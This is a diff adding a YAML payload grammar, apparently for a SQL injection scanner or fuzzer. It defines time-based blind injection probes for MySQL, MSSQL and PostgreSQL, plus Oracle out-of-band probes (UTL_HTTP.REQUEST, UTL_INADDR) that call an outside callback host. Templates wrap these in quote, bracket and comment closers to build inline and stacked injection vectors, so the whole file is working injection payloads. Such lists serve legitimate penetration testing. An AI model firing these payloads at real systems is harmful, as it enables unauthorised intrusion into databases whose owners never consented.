@@ -1,0 +1,59 @@
+mysql_select:
+  - BENCHMARK(1000000,MD5('A'))
+  - SLEEP(5)
+mssql_select:
+  - WAITFOR DELAY '00:00:20'
+postgre_select:
+  - pg_sleep(10)
+
+simple_select:
+  - "%mysql_select;"
+  - "%mssql_select;"
+  - "%postgre_select;"
+    
+oracle_select:
+  - UTL_INADDR.get_host_name('10.0.0.1')
+  - UTL_INADDR.get_host_address('5696d8f4.bzn.pw')
+  - UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')
+
+all_select:
+  - "%simple_select;"
+  - "%oracle_select;"
+
+stacked:
+  - BEGIN DBMS_LOCK.SLEEP(5); END; 
+  - WAITFOR DELAY '00:00:20'
+
+select_vectors:
+  - "+%all_select;"
+  - "+%all_select;%close;"
+  - "'+%all_select;+'a"
+  - "'+%all_select;%close;"
+  - "(%all_select;)"
+  - "(%all_select;)%close;"
+
+stacked_to_insert:
+  - "%stacked;"
+  - "select %simple_select;"
+  - "select %oracle_select; from dual"
+
+stacked_vectors:
+  - "%brackets;; %stacked_to_insert;; %comments;"
+  - "'%brackets;; %stacked_to_insert;; %comments;"
+
+all_vectors:
+  - "%select_vectors;"
+  - "%stacked_vectors;"
+
+close:
+  - "%brackets; %comments;"
+
+brackets:
+  - " "
+  - ") "
+  - ")) "
+  - ")))"
+
+comments:
+  - " -- "
+  - "/* "
